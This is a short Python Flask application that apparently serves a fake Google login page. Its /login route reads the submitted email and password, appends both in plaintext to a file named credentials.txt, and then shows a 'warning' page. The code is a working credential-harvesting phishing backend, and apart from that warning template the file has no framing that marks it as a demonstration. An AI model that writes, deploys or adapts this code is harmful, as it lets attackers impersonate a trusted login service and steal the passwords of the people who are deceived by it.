from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def index():
    return render_template("index.html")

@app.route('/login_google')
def google_login():
    return render_template("login_google.html")

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']
    with open('credentials.txt', 'a') as f:
        f.write(f"{email} : {password}\n")
    return render_template("warning.html", email=email)

if __name__ == '__main__':
    app.run(port=5000)
